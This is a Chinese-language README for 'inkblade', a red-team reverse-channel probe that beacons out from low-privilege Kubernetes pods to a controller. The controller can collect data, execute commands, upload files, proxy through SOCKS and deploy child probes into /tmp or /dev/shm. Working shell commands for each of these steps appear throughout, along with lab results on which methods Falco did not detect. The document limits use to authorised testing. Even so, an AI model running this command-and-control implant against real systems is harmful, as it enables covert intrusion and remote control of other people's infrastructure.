# 探针主动回连通道（Reverse Channel）

> 仅用于已获授权的测试环境。探针只在授权范围内运行，不提供未授权访问能力。
>
> 默认前提是普通/最低权限 Pod：非 root、无 hostPath、无 privileged、无
> kubeconfig、无 ServiceAccount token，仅允许出站 TCP。控制器不向目标 Pod
> 开放监听端口。

## 1. 传输选择

| 传输 | 形态 | 状态 |
|---|---|---|
| `tls` | TLS 内承载 4-byte length + JSON framed 协议（默认） | 已实现；Python 控制端与 Rust 探针均实测 |
| `wss` | TLS + RFC 6455 WebSocket，二进制消息承载 framed 字节流 | 已实现；Python 控制端与 Rust 探针均实测 |
| `https` | TLS + HTTP/1.1 长轮询：`POST /v1/probe/poll`、`POST /v1/probe/result` | 已实现；Python 控制端与 Rust 探针均实测 |

**没有公开明文传输。** `--transport tcp` 不属于产品选项；仅在进程内测试
中使用 `--lab-plaintext`，且必须设置 `INKBLADE_ALLOW_PLAINTEXT_LAB=1`。
CLI 输出会标注 `PLAINTEXT LAB`，不得用于真实目标。

HTTP/2 与 QUIC 本次**未实现**：`https` 是 HTTP/1.1 长轮询；不要把它描述为
HTTP/2 或 QUIC。WSS/HTTPS 的命令分发与 TLS 完全相同，均复用
`inkblade.channel.ProbeConnection` 的 request/collect/exec/upload/spawn/
dial/socks/cleanup 实现。

## 2. TLS、CA 与证书 pin

控制器首次启动时在
`<home>/evidence/<workspace>/reverse/tls/` 生成：

- `ca.pem`：CA 证书；
- `server.pem` / `server-key.pem`：服务器叶证书与私钥；
- `server.sha256`：叶证书 DER 的 SHA-256 pin。

也可以显式提供 `--tls-ca`、`--tls-cert`、`--tls-key`。私钥权限为 `0600`。

探针必须同时提供 CA 与 pin：

```sh
./inkblade-probe reverse \
  --transport tls \
  --host controller.example \
  --port 9443 \
  --ca-file ca.pem \
  --pin <server.sha256 内容> \
  --sni controller.example \
  --token-file /tmp/.inkblade-probe-token \
  --probe-id pod-a --read-only
```

校验顺序：rustls 先验证证书链、有效期、主机名/SNI，再对叶证书 DER 做
SHA-256 pin 比对；TLS 内再执行 challenge-HMAC-SHA256 token 认证。错误 pin、
错误 token、过期证书都会被拒绝。`--sni` 用于证书 SAN 与主机名不一致的
场景（例如按 Service DNS 名签发、按 Pod IP 连接）。

token 文件应为 `0600`，控制器会拒绝权限过宽的 token 文件（POSIX）。token
不写入 `probes.json`、控制口文件、审计输出或日志；`channel listen` 的
JSON 只输出 CA 路径和 pin，不输出 token。

## 3. 控制器监听与多探针

```sh
inkblade channel listen \
  --bind 0.0.0.0 --port 9443 \
  --transport tls \
  --token-file ./probe.token \
  --workspace local-lab \
  --max-probes 64 \
  --ping-interval 15 \
  --idle-timeout 60
```

- 每个连接独立线程/锁；认证成功后按 `probe_id` 注册。
- 重复 `probe_id` 采用**替换**策略：新连接生效，旧连接被关闭，记录
  `replaced: true`；状态文件只保留一行。
- `--max-probes` 限制唯一在线探针数；超限连接被关闭。
- `--max-pending` 限制单连接未完成 RPC 数，避免慢探针拖垮控制器。
- 状态写入 `<home>/evidence/<workspace>/reverse/probes.json`，字段包括
  `probe_id`、`parent_id`、`remote`、`transport`、`read_only`、`caps`、
  `last_seen`、`status`、`connected_at`；同时写入 SQLite 探针注册表，
  因此 `inkblade probe list` 和 UI 能看到回连探针。
- 控制口绑定 `127.0.0.1` 随机端口，随机 token 写入同目录 `control.json`
  （`0600`）。另一进程可用 `inkblade channel exec` 对已回连探针执行命令。

子探针由父探针上传并启动，回连后带 `parent_id` 注册：

```sh
inkblade probe deploy --reverse <parent_probe_id> \
  --binary ./inkblade-probe \
  --transport tls \
  --reverse-host controller.example --reverse-port 9443 \
  --ca-file ca.pem --pin <pin> --sni controller.example \
  --allow-write --workspace local-lab
```

上传优先 `/tmp`，失败回退 `/dev/shm`；两者都不可写（只读根文件系统且无
可写 emptyDir）时返回 `read_only_rootfs`，不会假装子探针已部署。父探针
保留子进程句柄和 `parent_id` 关系；控制器通过子探针自己的回连 socket
直接下发命令。

## 4. 长连接、心跳与重连

- 控制器默认每 15s 发 `ping`，60s 无活动（包括 ping 失败）则关闭并标记
  `offline`；`--ping-interval 0`/`--idle-timeout 0` 可关闭。
- 探针断线后按指数退避重连：1s、2s、4s……上限 60s，并加入抖动；
  重连后重新做 TLS 与 token 认证。`--no-reconnect` 只连接一次，
  `--max-retries N` 限制重试次数（0 表示不限制）。
- 控制器关闭时清理线程、socket、session 队列和探针句柄；`SIGINT`/
  `SIGTERM` 走同一清理路径。
- pending 请求、事件、stderr 尾、HTTP 长轮询 outbox 都有上界，不随连接
  时长无限增长。

## 5. 快速验证

一次性接收一个探针并执行 `collect`（适合自动化/CI）：

```sh
inkblade channel listen --once --exec collect \
  --bind 127.0.0.1 --port 9443 \
  --transport tls --tls-dir ./reverse-tls \
  --token-file ./probe.token --json
```

输出包含 `probe.probe_id`、`probe.remote`、`probe.transport`、
`probe.read_only`、`probe.caps` 和 `result`。退出码：认证/接收失败 2，
连接后动作失败 1，成功 0。

长驻模式：

```sh
inkblade channel listen --transport wss --wss-path /ws ...
inkblade channel listen --transport https --poll-path /v1/probe/poll ...
inkblade probe list --workspace local-lab
inkblade channel exec --workspace local-lab --probe-id pod-a --op ping --json
```

## 6. 本地防护实验与边界

`tests/reverse_defense_lab.py` 在 QEMU k3s 实验环境中创建普通低权限 Pod
（`runAsUser=65532`、`runAsNonRoot=true`、`readOnlyRootFilesystem=true`、
`privileged=false`、`allowPrivilegeEscalation=false`、
`automountServiceAccountToken=false`、无 hostPath），由 Pod 主动回连
另一个集群内控制器 Pod，三种传输分别执行 connect / collect / exec /
上传子探针回连。2026-10-27 实测摘要（完整 JSON 由脚本输出）：

| 项 | 结果 |
|---|---|
| TLS 回连 + collect + exec + 子探针 parent_id | 通过 |
| WSS 回连 + collect + exec + 子探针 parent_id | 通过 |
| HTTPS 长轮询 + collect + exec + 子探针 parent_id | 通过 |
| Falco 0.45.1 对三种反向通道流量 | `not-observed`（无对应规则命中） |
| Falco 对 existing-binary（`/bin/echo`） | `not-observed` |
| Falco 对 `/tmp` 复制二进制执行 | `not-observed`（本实验规则集；不等于通用绕过） |
| Falco 对 memfd 执行 | `detected`（`Fileless execution via memfd_create`） |
| Kyverno 1.19.2 | `not-applicable`（准入时只看到 Pod 对象，不看运行时回连流量） |
| WAF / ModSecurity | `not-applicable`（本实验没有 WAF 位于 Pod 出站路径） |

结论边界：

- 反向通道本身（TLS/WSS/HTTPS）未触发本次部署的 Falco 规则，属于
  `not-observed`，**不承诺对所有安全设备不可检测**；网络流量、eBPF、CNI、
  DNS、TLS 指纹或企业代理仍可能识别。
- memfd 在本规则集下被检测；不能把“未告警”写成“通用绕过”。
- Kyverno 是准入控制；它不会因为运行时的反向通道而告警，但会拦截
  privileged/hostPath 等 Pod 规格。
- WAF 只有在流量经过它时才可能检测；本实验没有这一跳。
- 未实现 HTTP/2、QUIC、域名前置、CDN 或真实公网 TLS 指纹伪装。

## 7. 低权限前提

- Pod 以非 root 运行，根文件系统只读，`/tmp` 或 `/dev/shm` 是可写
  emptyDir/tmpfs；没有 hostPath、privileged、额外 capability。
- 不需要 kubeconfig、ServiceAccount token、host PID/network 或 root。
- 只需要到控制器的出站 TCP（以及 DNS，如果使用域名）。
- 子探针写入 `/tmp` 或 `/dev/shm`；两者都不可写时明确失败，不回退到
  宿主机路径。

## 8. Rust 构建与验证

```sh
cd probe
cargo check
cargo build --release
```

本地开发验证：Windows GNU 工具链 `cargo check` 通过；构建的 release
探针在 Windows 上实测了 `tls`、`wss`、`https` 三种传输的 collect/exec，
以及 `spawn --reverse` 子探针回连和 `parent_id` 注册。
Linux musl 静态二进制由 `.github/workflows/probe-release.yml` 构建，
CI 运行 `tests.test_probe_rust_dynamic`、`tests.test_probe_reverse` 和
`tests.test_probe_reverse_rust`；本地未运行 musl 二进制。
